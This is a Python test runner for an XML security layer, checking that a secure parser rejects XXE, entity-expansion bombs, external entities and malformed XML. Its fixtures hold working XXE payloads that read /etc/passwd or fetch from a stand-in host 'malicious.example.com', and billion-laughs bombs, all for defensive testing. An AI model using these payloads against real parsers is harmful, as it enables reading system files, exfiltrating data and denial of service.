#!/usr/bin/env python3
"""
Test runner for XML security functionality.

This script runs comprehensive tests for XML security features including
XXE attack prevention, XML bomb protection, entity expansion limits,
external entity blocking, and malformed XML handling.
"""

import logging
import sys
from importlib import metadata
from pathlib import Path

# Import pytest for test framework compatibility
try:
    import pytest
except ImportError:
    pytest = None

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from pdfrebuilder.engine.validation_report import (  # noqa: E402
    XML_SECURITY_ENABLED,
    XMLParsingError,
    XMLSecurityConfig,
    XMLSecurityError,
    configure_xml_security,
    secure_xml_parse,
    secure_xml_pretty_print,
)


class XMLSecurityTestRunner:
    """Test runner for XML security functionality"""

    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.total = 0

        # Configure logging to capture security events
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def run_test(self, test_name, test_func):
        """Run a single test and track results"""
        self.total += 1
        print(f"\n{'=' * 60}")
        print(f"Running: {test_name}")
        print("=" * 60)

        try:
            test_func()
            self.passed += 1
            print(f"✓ PASSED: {test_name}")
        except Exception as e:
            self.failed += 1
            print(f"✗ FAILED: {test_name}")
            print(f"Error: {e}")
            import traceback

            traceback.print_exc()

    def test_xxe_attack_prevention(self):
        """Test XXE (XML External Entity) attack prevention"""
        xxe_payloads = [
            # File system access
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
            # HTTP request
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://malicious.example.com/steal-data">
]>
<root>&xxe;</root>""",
            # Parameter entity
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % param "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
%param;
]>
<root>&xxe;</root>""",
            # External DTD with entity
            """<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://malicious.example.com/evil.dtd" [
<!ENTITY internal "test">
]>
<root>&internal;</root>""",
        ]

        for i, payload in enumerate(xxe_payloads):
            print(f"Testing XXE payload {i + 1}...")
            try:
                secure_xml_parse(payload)
                raise AssertionError(f"XXE payload {i + 1} was NOT blocked!")
            except (XMLSecurityError, XMLParsingError):
                print(f"✓ XXE payload {i + 1} blocked successfully")

    def test_xml_bomb_protection(self):
        """Test XML bomb (billion laughs) attack protection"""
        bomb_payloads = [
            # Exponential expansion
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>""",
            # Quadratic expansion
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<root>&c;</root>""",
            # Recursive entities
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY a "&b;">
<!ENTITY b "&a;">
]>
<root>&a;</root>""",
        ]

        for i, payload in enumerate(bomb_payloads):
            print(f"Testing XML bomb payload {i + 1}...")
            try:
                secure_xml_parse(payload)
                raise AssertionError(f"XML bomb payload {i + 1} was NOT blocked!")
            except (XMLSecurityError, XMLParsingError):
                print(f"✓ XML bomb payload {i + 1} blocked successfully")

    def test_entity_expansion_limits(self):
        """Test entity expansion limits and controls"""
        expansion_payloads = [
            # Moderate entity expansion
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY small "x">
<!ENTITY medium "&small;&small;&small;&small;&small;&small;&small;&small;&small;&small;">
<!ENTITY large "&medium;&medium;&medium;&medium;&medium;&medium;&medium;&medium;&medium;&medium;">
]>
<root>&large;</root>""",
            # Deep entity nesting
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY e1 "content">
<!ENTITY e2 "&e1;">
<!ENTITY e3 "&e2;">
<!ENTITY e4 "&e3;">
<!ENTITY e5 "&e4;">
<!ENTITY e6 "&e5;">
<!ENTITY e7 "&e6;">
<!ENTITY e8 "&e7;">
<!ENTITY e9 "&e8;">
<!ENTITY e10 "&e9;">
<!ENTITY e11 "&e10;">
<!ENTITY e12 "&e11;">
<!ENTITY e13 "&e12;">
<!ENTITY e14 "&e13;">
<!ENTITY e15 "&e14;">
<!ENTITY e16 "&e15;">
<!ENTITY e17 "&e16;">
<!ENTITY e18 "&e17;">
<!ENTITY e19 "&e18;">
<!ENTITY e20 "&e19;">
<!ENTITY e21 "&e20;">
<!ENTITY e22 "&e21;">
<!ENTITY e23 "&e22;">
<!ENTITY e24 "&e23;">
<!ENTITY e25 "&e24;">
]>
<root>&e25;</root>""",
        ]

        for i, payload in enumerate(expansion_payloads):
            print(f"Testing entity expansion payload {i + 1}...")
            try:
                secure_xml_parse(payload)
                raise AssertionError(f"Entity expansion payload {i + 1} was NOT blocked!")
            except (XMLSecurityError, XMLParsingError):
                print(f"✓ Entity expansion payload {i + 1} blocked successfully")

    def test_external_entity_blocking(self):
        """Test external entity blocking"""
        external_payloads = [
            # External file entity
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY external SYSTEM "file:///etc/hosts">
]>
<root>&external;</root>""",
            # External URL entity
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY external SYSTEM "https://malicious.example.com/data.xml">
]>
<root>&external;</root>""",
            # External FTP entity
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY external SYSTEM "ftp://malicious.example.com/data.xml">
]>
<root>&external;</root>""",
            # External parameter entity
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % external SYSTEM "http://malicious.example.com/evil.dtd">
%external;
]>
<root>content</root>""",
        ]

        for i, payload in enumerate(external_payloads):
            print(f"Testing external entity payload {i + 1}...")
            try:
                secure_xml_parse(payload)
                raise AssertionError(f"External entity payload {i + 1} was NOT blocked!")
            except (XMLSecurityError, XMLParsingError):
                print(f"✓ External entity payload {i + 1} blocked successfully")

    def test_malformed_xml_handling(self):
        """Test malformed XML handling"""
        malformed_payloads = [
            # Unclosed tags
            "<root><child>content</root>",
            # Mismatched tags
            "<root><child>content</other></root>",
            # Invalid characters
            "<root>content with \x00 null byte</root>",
            # Incomplete XML
            "<root><child>content",
            # Empty XML
            "",
            # Whitespace only
            "   \n\t   ",
            # Invalid attribute syntax
            '<root attr1=value1 attr2="value2>content</root>',
            # Malformed CDATA
            "<root><![CDATA[content]]</root>",
        ]

        for i, payload in enumerate(malformed_payloads):
            print(f"Testing malformed XML payload {i + 1}: {payload[:50]!r}...")
            try:
                secure_xml_parse(payload)
                raise AssertionError(f"Malformed XML payload {i + 1} was NOT caught!")
            except XMLParsingError:
                print(f"✓ Malformed XML payload {i + 1} caught successfully")
            except XMLSecurityError:
                print(f"✓ Malformed XML payload {i + 1} caught as security error")

    def test_valid_xml_parsing(self):
        """Test that valid XML still parses correctly"""
        valid_payloads = [
            # Simple XML
            "<root><child>content</child></root>",
            # XML with attributes
            '<root attr1="value1" attr2="value2"><child id="123">content</child></root>',
            # XML with namespaces
            """<root xmlns="http://example.com" xmlns:ns="http://namespace.com">
                <ns:element>content</ns:element>
            </root>""",
            # XML with Unicode
            """<?xml version="1.0" encoding="UTF-8"?>
<root>
    <content>Hello 世界 🌍</content>
</root>""",
            # XML with mixed content
            """<root>
                Text before
                <child>child content</child>
                Text after
            </root>""",
        ]

        for i, payload in enumerate(valid_payloads):
            print(f"Testing valid XML payload {i + 1}...")
            try:
                result = secure_xml_parse(payload)
                assert result.tag.endswith("root"), f"Expected root element, got {result.tag}"
                print(f"✓ Valid XML payload {i + 1} parsed successfully")
            except Exception as e:
                raise AssertionError(f"Valid XML payload {i + 1} failed to parse: {e}")

    def test_pretty_print_functionality(self):
        """Test secure XML pretty printing"""
        from xml.etree.ElementTree import Element, SubElement

        print("Testing XML pretty printing...")

        # Create test XML structure
        root = Element("testsuites")
        root.set("name", "Test Suite")
        root.set("tests", "2")

        suite = SubElement(root, "testsuite")
        suite.set("name", "ValidationTest")

        case1 = SubElement(suite, "testcase")
        case1.set("name", "Test 1")
        case1.set("classname", "TestClass")

        case2 = SubElement(suite, "testcase")
        case2.set("name", "Test 2")
        case2.set("classname", "TestClass")

        failure = SubElement(case2, "failure")
        failure.set("message", "Test failed")
        failure.text = "Failure details"

        # Test pretty printing
        try:
            pretty_xml = secure_xml_pretty_print(root)

            # Verify structure
            assert "testsuites" in pretty_xml
            assert "testsuite" in pretty_xml
            assert "testcase" in pretty_xml
            assert "failure" in pretty_xml
            assert "Test Suite" in pretty_xml
            assert "Test failed" in pretty_xml
            assert "Failure details" in pretty_xml

            print("✓ XML pretty printing works correctly")

        except Exception as e:
            raise AssertionError(f"XML pretty printing failed: {e}")

    def test_security_configuration(self):
        """Test security configuration functionality"""
        print("Testing security configuration...")

        # Test default configuration
        default_config = XMLSecurityConfig()
        assert default_config.forbid_dtd is True
        assert default_config.forbid_entities is True
        assert default_config.forbid_external is True
        assert default_config.max_entity_expansion == 1000
        assert default_config.max_entity_depth == 20
        print("✓ Default configuration is correct")

        # Test custom configuration
        custom_config = XMLSecurityConfig(
            forbid_dtd=False,
            forbid_entities=True,
            forbid_external=False,
            max_entity_expansion=500,
            max_entity_depth=10,
        )

        configure_xml_security(custom_config)
        print("✓ Custom configuration applied successfully")

        # Restore default configuration
        configure_xml_security(default_config)
        print("✓ Configuration restored to defaults")

    def test_security_status(self):
        """Test XML security status and availability"""
        print(f"XML Security Enabled: {XML_SECURITY_ENABLED}")

        if XML_SECURITY_ENABLED:
            print("✓ defusedxml library is available and active")
            try:
                version = metadata.version("defusedxml")
                print(f"✓ defusedxml version: {version}")
            except ImportError:
                raise AssertionError("XML_SECURITY_ENABLED is True but defusedxml not importable")
        else:
            print("⚠ defusedxml library is not available - using fallback mode")
            print("  This means XML parsing is vulnerable to security attacks")

    def run_all_tests(self):
        """Run all XML security tests"""
        print("=" * 80)
        print("XML SECURITY TEST SUITE")
        print("=" * 80)

        # Test security status first
        self.run_test("Security Status Check", self.test_security_status)

        # Test security configuration
        self.run_test("Security Configuration", self.test_security_configuration)

        # Test valid XML parsing (baseline)
        self.run_test("Valid XML Parsing", self.test_valid_xml_parsing)

        # Test pretty printing functionality
        self.run_test("Pretty Print Functionality", self.test_pretty_print_functionality)

        # Test security features
        self.run_test("XXE Attack Prevention", self.test_xxe_attack_prevention)
        self.run_test("XML Bomb Protection", self.test_xml_bomb_protection)
        self.run_test("Entity Expansion Limits", self.test_entity_expansion_limits)
        self.run_test("External Entity Blocking", self.test_external_entity_blocking)
        self.run_test("Malformed XML Handling", self.test_malformed_xml_handling)

        # Print summary
        print("\n" + "=" * 80)
        print("TEST SUMMARY")
        print("=" * 80)
        print(f"Total Tests: {self.total}")
        print(f"Passed: {self.passed}")
        print(f"Failed: {self.failed}")
        print(f"Success Rate: {(self.passed / self.total) * 100:.1f}%")

        if self.failed == 0:
            print("\n🎉 ALL TESTS PASSED! XML security is working correctly.")
            return 0
        else:
            print(f"\n❌ {self.failed} TEST(S) FAILED! Please review the failures above.")
            return 1


def main():
    """Main entry point"""
    runner = XMLSecurityTestRunner()
    exit_code = runner.run_all_tests()
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
